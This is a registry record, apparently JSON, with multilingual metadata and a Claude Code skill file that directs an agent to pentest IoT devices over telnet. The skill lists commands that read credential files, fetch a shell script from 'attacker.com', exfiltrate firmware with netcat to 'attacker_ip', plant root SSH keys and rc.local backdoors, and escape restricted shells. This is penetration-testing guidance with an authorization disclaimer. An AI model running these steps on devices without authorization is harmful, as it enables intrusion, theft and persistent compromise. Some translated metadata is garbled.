raktion mit IoT-Geräten","pt":"Telnet Shell para IoT: Ferramenta de Teste de Segurança","ru":"Telnet Shell для IoT: Инструмент для тестирования безопас...","ar":"Telnet Shell لآي أو تي: أداة اختبار الأمن","en":"telnetshell"},"description":{"zh":"Telnet Shell 技术用于 IoT 设备的安全测试和渗透测试，支持多种功能","ja":"Telnet Shell 技術は IoT デバイスのセキュリティテストとペネトレーションテストに使用され、多くの機能をサポート","ko":"텔넷 쉘 기술은 IoT 기기의 보안 테스트와 침투 테스트에 사용되며多くの 기능을 지원","es":"telnetshell permite interactuar con dispositivos IoT a través de telnet para pruebas de seguridad y penetración","fr":"telnetshell permet d''interagir avec les périphériques IoT via telnet pour les tests de sécurité et de pénétration","de":"telnetshell ermöglicht die Interaktion mit IoT-Geräten über telnet für Sicherheits- und Penetrationstests","pt":"O telnetshell é uma ferramenta de teste de segurança para dispositivos IoT que permite interagir com shells de dispositivos via telnet. Ele suporta testes de...","ru":"Telnetshell — это инструмент для тестирования безопасности устройств IoT, позволяющий взаимодействовать с оболочками устройств через telnet. Он поддерживает ...","ar":"Telnetshell هو أداة اختبار الأمن للأجهزة التي يمكن الوصول إليها عبر telnet، مما يسمح بالتفاعل مع هياكل الأجهزة عبر telnet. يدعم اختبار المصادقة الضعيفة وإنشا...","en":"The most comprehensive Claude Code skills registry | Web Search: https://skills-registry-web.vercel.app"},"definition":{"en":"The most comprehensive Claude Code skills registry | Web Search: https://skills-registry-web.vercel.app"},"features":{"zh":["无认证 shells","弱认证测试","设备枚举","后期利用活动"],"ja":["認証なしシェル","弱認証テスト","デバイス列挙","ポストエクスプロイト活動"],"ko":["인증 없는 쉘","약한 인증 테스트","기기 열거","사후 활용 활동"],"es":["Acceso a dispositivos IoT a través de telnet","Pruebas de autenticación débil","Enumeración de dispositivos","Actividades de post-explotación"],"fr":["Accès aux périphériques IoT via telnet","Tests d''authentification faible","Énumération des périphériques","Activités de post-exploitation"],"de":["Zugriff auf IoT-Geräte über telnet","Schwache Authentifizierungstests","Auflistung von Geräten","Post-Exploitation-Aktivitäten"],"pt":["Suporte a shells de dispositivos não autenticados","Teste de autenticação fraca","Enumeração de dispositivos","Atividades pós-exploração","Requer Python 3 e biblioteca pexpect"],"ru":["Поддержка неаутентифицированных оболочек устройств","Тестирование слабой аутентификации","Перечисление устройств","Послепexplode-деятельность","Требуется Python 3 и библиотека pexpect"],"ar":["دعم هياكل الأجهزة غير المصرح بها","اختبار المصادقة الضعيفة","إنشاء قائمة بالأجهزة","الأنشطة بعد الكشف","يتطلب Python 3 ومكتبة pexpect"]},"keywords":{"zh":["Telnet Shell","IoT 设备安全测试","渗透测试","安全测试工具","IoT 安全"],"ja":["Telnet Shell","IoT デバイスのセキュリティテスト","ペネトレーションテスト","セキュリティテストツール","IoT セキュリティ"],"ko":["텔넷 쉘","IoT 기기 보안 테스트","침투 테스트","보안 테스트 도구","IoT 보안"],"es":["telnetshell","IoT","seguridad","penetración","pruebas de seguridad","dispositivos IoT","telnet"],"fr":["telnetshell","IoT","sécurité","pénétration","tests de sécurité","périphériques IoT","telnet"],"de":["telnetshell","IoT","Sicherheit","Penetration","Sicherheitstests","IoT-Geräte","telnet"],"pt":["telnetshell","teste de segurança","dispositivos IoT","autenticação fraca","enumeração de dispositivos","pós-exploração","Python 3","pexpect"],"ru":["telnetshell","тестирование безопасности","устройства IoT","слабая аутентификация","перечисление устройств","послепexplode-деятельность","Python 3","pexpect"],"ar":["telnetshell","اختبار الأمن","أجهزة IoT","المصادقة الضعيفة","إنشاء قائمة بالأجهزة","الأنشطة بعد الكشف","Python 3","pexpect"]}},"owner":"majiayu000","repo":"claude-skill-registry","repoPath":"majiayu000/claude-skill-registry","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.400Z","topics":[],"category":"community","skillMd":{"name":"telnetshell","description":"Use telnet to interact with IoT device shells for pentesting operations including device enumeration, vulnerability discovery, credential testing, and post-exploitation. Use when the user needs to interact with network-accessible shells, IoT devices, or telnet services.","bodyPreview":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the tar","body":"# IoT Telnet Shell (telnetshell)\n\nThis skill enables interaction with IoT device shells accessible via telnet for security testing and penetration testing operations. It supports unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities.\n\n## Prerequisites\n\n- Python 3 with pexpect library (`pip install pexpect` or `sudo pacman -S python-pexpect`)\n- telnet client installed on the system (`sudo pacman -S inetutils` on Arch)\n- Network access to the target device''s telnet port\n\n## Recommended Approach: Telnet Helper Script\n\n**IMPORTANT**: This skill includes a Python helper script (`telnet_helper.py`) that provides a clean, reliable interface for telnet communication. **This is the RECOMMENDED method** for interacting with IoT devices.\n\n### Default Session Logging\n\n**ALL commands run by Claude will be logged to `/tmp/telnet_session.log` by default.**\n\nTo observe what Claude is doing in real-time:\n```bash\n# In a separate terminal, run:\ntail -f /tmp/telnet_session.log\n```\n\nThis allows you to watch all telnet I/O as it happens without interfering with the connection.\n\n### Why Use the Telnet Helper?\n\nThe helper script solves many problems with direct telnet usage:\n- **Clean output**: Automatically removes command echoes, prompts, and ANSI codes\n- **Prompt detection**: Automatically detects and waits for device prompts\n- **Timeout handling**: Proper timeout management with no arbitrary sleeps\n- **Easy scripting**: Simple command-line interface for single commands or batch operations\n- **Session logging**: All I/O logged to `/tmp/telnet_session.log` for observation\n- **Reliable**: No issues with TTY requirements or background processes\n- **JSON output**: For programmatic parsing and tool chaining\n\n### Quick Start with Telnet Helper\n\n**Single Command:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n```\n\n**Custom Port:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n```\n\n**With Custom Prompt (recommended for known devices):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --prompt \"^/ [#\\$]\" --command \"ifconfig\"\n```\n\n**Interactive Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n**Batch Commands from File:**\n```bash\n# Create a file with commands (one per line)\necho -e \"uname -a\\ncat /proc/version\\nifconfig\\nps\" > commands.txt\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --script commands.txt\n```\n\n**JSON Output (for parsing):**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\" --json\n```\n\n**Debug Mode:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"ls\" --debug\n```\n\n**Session Logging (for observation):**\n```bash\n# Terminal 1 - Run with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/session.log \\\n  --interactive\n\n# Terminal 2 - Watch the session in real-time\ntail -f /tmp/session.log\n```\n\n**Note:** See `OBSERVING_SESSIONS.md` for comprehensive guide on monitoring telnet sessions.\n\n### Telnet Helper Options\n\n```\nRequired (one of):\n  --command, -c CMD         Execute single command\n  --interactive, -i         Enter interactive mode\n  --script, -s FILE         Execute commands from file\n\nConnection Options:\n  --host, -H HOST           Target host IP or hostname (required)\n  --port, -P PORT           Telnet port (default: 23)\n  --timeout, -t SECONDS     Command timeout (default: 3.0)\n  --prompt, -p PATTERN      Custom prompt regex pattern\n\nOutput Options:\n  --raw, -r                 Don''t clean output (show echoes, prompts)\n  --json, -j                Output in JSON format\n  --logfile, -l FILE        Log all I/O to file (default: /tmp/telnet_session.log)\n  --debug                   Show debug information\n```\n\n### Common Prompt Patterns\n\nThe helper script includes common prompt patterns, but you can specify custom ones:\n\n```bash\n# BusyBox shell (common on IoT)\n--prompt \"/\\s*[#\\$]\\s*$\"\n\n# Standard root/user prompts\n--prompt \"^[#\\$]\\s*$\"\n\n# Custom device\n--prompt \"^MyDevice>\\s*$\"\n\n# Uniview cameras\n--prompt \"^User@[^>]+>\\s*$\"\n```\n\n### Device Enumeration Example with Telnet Helper\n\nHere''s a complete example of safely enumerating a device:\n\n```bash\n# Set variables for convenience\nHELPER=\"python3 .claude/skills/telnetshell/telnet_helper.py\"\nHOST=\"192.168.1.100\"\nPORT=\"2222\"\nLOGFILE=\"/tmp/telnet_session.log\"\n\n# System information\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"uname -a\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/version\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /proc/cpuinfo\"\n\n# Check for BusyBox\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"busybox\"\n\n# Network configuration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ifconfig\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"route -n\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"netstat -tulpn\"\n\n# Process listing (may need longer timeout)\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --timeout 5 --command \"ps aux\"\n\n# File system exploration\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"ls -la /\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"mount\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"df -h\"\n\n# Security assessment\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"cat /etc/passwd\"\n$HELPER --host $HOST --port $PORT --logfile \"$LOGFILE\" --command \"find / -perm -4000 2>/dev/null\"\n```\n\n**IMPORTANT FOR CLAUDE CODE**: When using this skill, ALWAYS include `--logfile /tmp/telnet_session.log` in every command so the user can monitor activity with `tail -f /tmp/telnet_session.log`.\n\n## Instructions\n\n### 1. Connection Setup\n\n**Default connection:**\n- **Port**: 23 (standard telnet, override with `--port`)\n- **Timeout**: 3 seconds (override with `--timeout`)\n- **Logging**: `/tmp/telnet_session.log` by default\n\n**Common telnet ports on IoT devices:**\n- 23: Standard telnet port\n- 2222: Alternative telnet port (common on cameras)\n- 8023: Alternative telnet port\n- Custom ports: Check device documentation or nmap scan results\n\n### 2. BusyBox Shells (Most IoT Devices)\n\n**IMPORTANT**: The vast majority of IoT devices use BusyBox, a lightweight suite of Unix utilities designed for embedded systems. BusyBox provides a minimal shell environment with limited command functionality.\n\n**Identifying BusyBox:**\n```bash\n# Check what shell you''re using\nbusybox\nbusybox --help\n\n# Or check symlinks\nls -la /bin/sh\n# Often shows: /bin/sh -> /bin/busybox\n\n# List available BusyBox applets\nbusybox --list\n```\n\n**BusyBox Limitations:**\n- Many standard Linux commands may be simplified versions\n- Some common flags/options may not be available\n- Features like tab completion may be limited or absent\n- Some exploitation techniques that work on full Linux may not work\n\n**Common BusyBox commands available:**\n```bash\n# Core utilities (usually available)\ncat, ls, cd, pwd, echo, cp, mv, rm, mkdir, chmod, chown\nps, kill, top, free, df, mount, umount\ngrep, find, sed, awk (limited versions)\nifconfig, route, ping, netstat, telnet\nvi (basic text editor - no syntax highlighting)\n\n# Check what''s available\nbusybox --list | sort\nls /bin /sbin /usr/bin /usr/sbin\n```\n\n**BusyBox-specific considerations for pentesting:**\n- `ps` output format may differ from standard Linux\n- Some privilege escalation techniques require commands not in BusyBox\n- File permissions still work the same (SUID, sticky bits, etc.)\n- Networking tools are often present (telnet, wget, nc/netcat, ftpget)\n- Python/Perl/Ruby are usually NOT available (device storage constraints)\n\n**Useful BusyBox commands for enumeration:**\n```bash\n# Check BusyBox version (may have known vulnerabilities)\nbusybox | head -1\n\n# Network utilities often available\nnc -l -p 4444  # Netcat listener\nwget http://attacker.com/shell.sh\nftpget server file\ntelnet 192.168.1.1\n\n# httpd (web server) often included\nbusybox httpd -p 8080 -h /tmp  # Quick file sharing\n```\n\n### 3. Device Enumeration\n\nOnce you have shell access, gather the following information:\n\n**System Information:**\n```bash\n# Kernel and system info\nuname -a\ncat /proc/version\ncat /proc/cpuinfo\ncat /proc/meminfo\n\n# Distribution/firmware info\ncat /etc/issue\ncat /etc/*release*\ncat /etc/*version*\n\n# Hostname and network\nhostname\ncat /etc/hostname\nifconfig -a\ncat /etc/network/interfaces\ncat /etc/resolv.conf\n\n# Mounted filesystems\nmount\ncat /proc/mounts\ndf -h\n\n# Running processes\nps aux\nps -ef\ntop -b -n 1\n```\n\n**User and Permission Information:**\n```bash\n# Current user context\nid\nwhoami\ngroups\n\n# User accounts\ncat /etc/passwd\ncat /etc/shadow  # If readable - major security issue!\ncat /etc/group\n\n# Sudo/privilege info\nsudo -l\ncat /etc/sudoers\n```\n\n**Network Services:**\n```bash\n# Listening services\nnetstat -tulpn\nlsof -i\n\n# Firewall rules\niptables -L -n -v\ncat /etc/iptables/*\n```\n\n**Interesting Files and Directories:**\n```bash\n# Configuration files\nls -la /etc/\nfind /etc/ -type f -readable\n\n# Web server configs\nls -la /etc/nginx/\nls -la /etc/apache2/\nls -la /var/www/\n\n# Credentials and keys\nfind / -name \"*.pem\" 2>/dev/null\nfind / -name \"*.key\" 2>/dev/null\nfind / -name \"*password*\" 2>/dev/null\nfind / -name \"*credential*\" 2>/dev/null\ngrep -r \"password\" /etc/ 2>/dev/null\n\n# SUID/SGID binaries (privilege escalation vectors)\nfind / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null\n\n# World-writable files/directories\nfind / -perm -2 -type f 2>/dev/null\nfind / -perm -2 -type d 2>/dev/null\n\n# Development/debugging tools\nwhich gdb gcc python perl ruby tcpdump\nls /usr/bin/ /bin/ /sbin/ /usr/sbin/\n```\n\n### 4. Privilege Escalation (if not root)\n\n**Check for common vulnerabilities:**\n```bash\n# Kernel exploits\nuname -r  # Check kernel version for known exploits\n\n# Check for exploitable services\nps aux | grep root\n\n# Writable service files\nfind /etc/init.d/ -writable 2>/dev/null\n\n# Cron jobs\ncrontab -l\nls -la /etc/cron*\ncat /etc/crontab\n```\n\n### 5. Persistence and Further Access\n\n**Establish additional access methods:**\n```bash\n# Add SSH access (if SSH is available)\nmkdir -p /root/.ssh\necho \"your_ssh_public_key\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\n\n# Start SSH service (if not running)\n/etc/init.d/ssh start\n# or\n/etc/init.d/sshd start\n# or\n/etc/init.d/dropbear start  # Common on embedded devices\n\n# Add to startup scripts\necho \"/path/to/backdoor &\" >> /etc/rc.local\n```\n\n### 6. Firmware Extraction\n\n**Extract firmware for offline analysis:**\n```bash\n# Find MTD partitions (common on embedded devices)\ncat /proc/mtd\ncat /proc/partitions\n\n# Dump flash partitions\ndd if=/dev/mtd0 of=/tmp/bootloader.bin\ndd if=/dev/mtd1 of=/tmp/kernel.bin\ndd if=/dev/mtd2 of=/tmp/rootfs.bin\n\n# Copy to external storage or network\n# If network is available:\nnc attacker_ip 4444 < /tmp/rootfs.bin\n\n# If HTTP server is available:\ncd /tmp\nbusybox httpd -p 8000\n# Then download from http://device_ip:8000/rootfs.bin\n```\n\n## Common IoT Device Scenarios\n\n### Scenario 1: No Authentication Shell\n```bash\n# Connect - drops directly to root shell\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --interactive\n# Enumerate and exploit\n```\n\n### Scenario 2: Custom Port No-Auth Shell\n```bash\n# Many IoT cameras use port 2222\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --interactive\n```\n\n### Scenario 3: Password-Protected Shell\n```bash\n# If you encounter a password prompt, the helper will detect it\n# Try default credentials:\n# - root/root\n# - admin/admin\n# - root/(empty)\n# Search online for device-specific defaults\n```\n\n### Scenario 4: Limited Shell Escape\n```bash\n# If you get a limited shell:\n# Try common escape techniques:\necho $SHELL\n/bin/sh\n/bin/bash\nvi  # Then :!/bin/sh\nless /etc/passwd  # Then !/bin/sh\nfind / -exec /bin/sh \\;\nawk ''BEGIN {system(\"/bin/sh\")}''\n```\n\n## Security Testing Checklist\n\n- [ ] Identify device and firmware version\n- [ ] Check for unauthenticated access\n- [ ] Test for default/weak credentials\n- [ ] Enumerate network services and open ports\n- [ ] Check for hardcoded credentials in files\n- [ ] Test for command injection vulnerabilities\n- [ ] Check file permissions (SUID, world-writable)\n- [ ] Check for outdated software with known CVEs\n- [ ] Test for privilege escalation vectors\n- [ ] Extract firmware for offline analysis\n- [ ] Document all findings with screenshots/logs\n\n## Best Practices\n\n1. **Always log your session**: Default logfile is `/tmp/telnet_session.log`\n2. **Document everything**: Take notes on commands, responses, and findings\n3. **Use batch scripts**: Create enumeration scripts for common tasks\n4. **Research the device**: Look up known vulnerabilities, default credentials, and common issues\n5. **Use proper authorization**: Only perform pentesting on devices you own or have explicit permission to test\n6. **Be careful with destructive commands**: Avoid commands that could brick devices or corrupt data\n7. **Monitor your session**: Use `tail -f` in another terminal to watch activity\n\n## Troubleshooting\n\n**Problem: Connection refused**\n- Solution: Check if telnet service is running, verify port number, check firewall rules\n\n**Problem: Connection timeout**\n- Solution: Verify network connectivity, check if device is powered on, verify IP address\n\n**Problem: \"Permission denied\"**\n- Solution: Telnet service may require authentication, try default credentials\n\n**Problem: Commands not echoing**\n- Solution: Use `--raw` flag to see unfiltered output\n\n**Problem: Garbled output or wrong prompt detection**\n- Solution: Use `--prompt` flag with custom regex pattern for your specific device\n\n## Pre-built Enumeration Scripts\n\nThe skill includes pre-built enumeration scripts for common tasks:\n\n- `enum_system.txt`: System information gathering\n- `enum_network.txt`: Network configuration enumeration\n- `enum_files.txt`: File system exploration\n- `enum_security.txt`: Security-focused enumeration\n\n**Usage:**\n```bash\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script .claude/skills/telnetshell/enum_system.txt\n```\n\n## Example Usage\n\n```bash\n# Basic connection to standard telnet port\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --command \"uname -a\"\n\n# Connection to custom port (common for IoT cameras)\npython3 .claude/skills/telnetshell/telnet_helper.py --host 192.168.1.100 --port 2222 --command \"ls /\"\n\n# Interactive session with logging\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --logfile /tmp/camera_session.log \\\n  --interactive\n\n# Batch enumeration\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --port 2222 \\\n  --script enum_system.txt \\\n  --json > results.json\n\n# Long-running command with custom timeout\npython3 .claude/skills/telnetshell/telnet_helper.py \\\n  --host 192.168.1.100 \\\n  --timeout 10 \\\n  --command \"find / -name ''*.conf''\"\n```\n\n## References\n\n- [BusyBox Official Site](https://busybox.net/)\n- [BusyBox Command List](https://busybox.net/downloads/BusyBox.html)\n- IoT pentesting resources and vulnerability databases\n- Device-specific documentation and datasheets\n"},"lastSynced":"2026-02-18T02:49:19.540Z","agentAnalysis":{"suitability":{"en":"Perfect for Security Testing Agents needing advanced IoT device interaction via telnet for penetration testing operations.","zh":"非常适合需要通过telnet进行高级IoT设备交互的安全测试代理，用于渗透测试操作。","ja":"セキュリティテストエージェントがIoTデバイスとの高度なやり取りを行うためにtelnetを使用する必要があるペネトレーションテスト操作に最適です。","ko":"텔넷을 통해 고급 IoT 장치 상호 작용이 필요한 보안 테스트 에이전트에게 적합합니다. 침투 테스트 작동을 위해 설계되었습니다.","es":"Perfecto para agentes de pruebas de seguridad que necesitan una interacción avanzada con dispositivos IoT a través de telnet para operaciones de pruebas de penetración.","fr":"Parfait pour les agents de test de sécurité ayant besoin d''une interaction avancée avec des appareils IoT via telnet pour des opérations de test de pénétration.","de":"Perfekt für Sicherheitstestagenten, die eine erweiterte Interaktion mit IoT-Geräten über Telnet für Penetrationstests benötigen.","pt":"Perfeito para Agentes de Teste de Segurança que precisam de interação avançada com dispositivos IoT via telnet para operações de testes de penetração.","ru":"Идеально для агентов по тестированию безопасности, которым требуется расширенное взаимодействие с устройствами IoT через telnet для операций по тестированию на проникновение.","ar":"مثالي لعمليات وكيل اختبار الأمن التي تحتاج إلى تفاعل متقدم مع أجهزة أجهزة الإنترنت عبر تيلنيت لأداء عمليات اختبار الاختراق."},"recommendation":{"en":"Empowers agents to interact with IoT device shells using telnet, supporting unauthenticated shells, weak authentication testing, device enumeration, and post-exploitation activities with Python 3 and the pexpect library.","zh":"赋予代理使用telnet与IoT设备shell交互的能力，支持无身份验证shell、弱身份验证测试、设备枚举和使用Python 3及pexpect库的后期开发活动。","ja":"エージェントがtelnetを使用してIoTデバイスのシェルとやり取りすることを可能にし、認証されていないシェル、弱い認証のテスト、デバイスの列挙、Python 3およびpexpectライブラリを使用した後期開発活動をサポートします。","ko":"에이전트가 텔넷을 사용하여 IoT 장치 쉘과 상호 작용할 수 있도록 하며, 인증되지 않은 쉘, 약한 인증 테스트, 장치 열거 및 Python 3 및 pexpect 라이브러리를 사용한 사후 개발 활동을 지원합니다.","es":"Habilita a los agentes a interactuar con shells de dispositivos IoT usando telnet, soportando shells no autenticados, pruebas de autenticación débil, enumeración de dispositivos y actividades de postexplotación con Python 3 y la biblioteca pexpect.","fr":"Permet aux agents d''interagir avec des coquilles d''appareils IoT à l''aide de telnet, en prenant en charge les coquilles non authentifiées, les tests d''authentification faible, l''énumération des appareils et les activités post-exploitation avec Python 3 et la bibliothèque pexpect.","de":"Ermächtigt Agenten, mit IoT-Geräteschalen über Telnet zu interagieren, unterstützt nicht authentifizierte Schalen, schwache Authentifizierungstests, Geräteaufzählung und Post-Exploitation-Aktivitäten mit Python 3 und der pexpect-Bibliothek.","pt":"Permite que os agentes interajam com shells de dispositivos IoT usando telnet, suportando shells não autenticados, testes de autenticação fraca, enumeração de dispositivos e atividades pós-exploração com Python 3 e a biblioteca pexpect.","ru":"Позволяет агентам взаимодействовать с оболочками устройств IoT с помощью telnet, поддерживая неаутентифицированные оболочки, тестирование слабой аутентификации, перечисление устройств и действия после эксплуатации с Python 3 и библиотекой pexpect.","ar":"تمكن الوكيل من التفاعل مع غلاف أجهزة الإنترنت عبر تيلنيت، مع دعم غلاف غير مصحوب بالتحقق، اختبار التحقق الضعيف، تعداد الأجهزة وأعمال ما بعد الاستغلال مع بايثون 3 ومكتبة pexpect."},"useCases":{"en":["Conducting device enumeration for security audits","Performing weak authentication testing on IoT devices","Executing post-exploitation activities on compromised devices"],"zh":["进行安全审计的设备枚举","在IoT设备上执行弱身份验证测试","在损害设备上执行后期开发活动"],"ja":["セキュリティ監査のためのデバイスの列挙","IoTデバイスでの弱い認証のテストの実行","侵害されたデバイスでの後期開発活動の実行"],"ko":["보안審査를 위한 장치 열거","IoT 장치에서 약한 인증 테스트 수행","피해 장치에서 사후 개발 활동 수행"],"es":["Realizar enumeración de dispositivos para auditorías de seguridad","Realizar pruebas de autenticación débil en dispositivos IoT","Ejecutar actividades de postexplotación en dispositivos comprometidos"],"fr":["Effectuer une énumération d''appareils pour des audits de sécurité","Effectuer des tests d''authentification faible sur des appareils IoT","Exécuter des activités post-exploitation sur des appareils compromis"],"de":["Durchführen einer Geräteaufzählung für Sicherheitsaudits","Durchführen von schwachen Authentifizierungstests auf IoT-Geräten","Ausführen von Post-Exploitation-Aktivitäten auf kompromittierten Geräten"],"pt":["Realizar enumeração de dispositivos para auditorias de segurança","Realizar testes de autenticação fraca em dispositivos IoT","Executar atividades pós-exploração em dispositivos comprometidos"],"ru":["Проведение перечисления устройств для аудита безопасности","Проведение тестирования слабой аутентификации на устройствах IoT","Выполнение действий после эксплуатации на скомпрометированных устройствах"],"ar":["إجراء تعداد للأجهزة لعمليات التدقيق الأمني","إجراء اختبارات التحقق الضعيف على أجهزة الإنترنت","تنفيذ أعمال ما بعد الاستغلال على الأجهزة المخترقة"]},"limitations":{"en":["Requires Python 3 with pexpect library","Needs telnet client installed on the system","Requires network access to the target device"],"zh":["需要Python 3及pexpect库","需要在系统上安装telnet客户端","需要目标设备的网络访问"],"ja":["Python 3とpexpectライブラリが必要","システムにtelnetクライアントをインストールする必要がある","ターゲットデバイスへのネットワークアクセスが必要"],"ko":["Python 3 및 pexpect 라이브러리 필요","시스템에 텔넷 클라이언트 설치 필요","대상 장치에 대한 네트워크 액세스가 필요"],"es":["Requiere Python 3 con la biblioteca pexpect","Necesita un cliente telnet instalado en el sistema","Requiere acceso a la red al dispositivo objetivo"],"fr":["Nécessite Python 3 avec la bibliothèque pexpect","Nécessite un client telnet installé sur le système","Nécessite un accès au réseau au périphérique cible"],"de":["Benötigt Python 3 mit der pexpect-Bibliothek","Benötigt einen Telnet-Client, der auf dem System installiert ist","Benötigt Netzwerkzugriff auf das Zielgerät"],"pt":["Requer Python 3 com biblioteca pexpect","Necessita de cliente telnet instalado no sistema","Requer acesso de rede ao dispositivo alvo"],"ru":["Требуется Python 3 с библиотекой pexpect","Требуется клиент telnet, установленный в системе","Требуется доступ к сети к целевому устройству"],"ar":["يتطلب بايثون 3 مع مكتبة pexpect","يتطلب تثبيت عميل تيلنيت على النظام","يتطلب وصولًا إلى الشبكة إلى الجهاز المستهدف"]},"version":3},"qualityScore":80}');
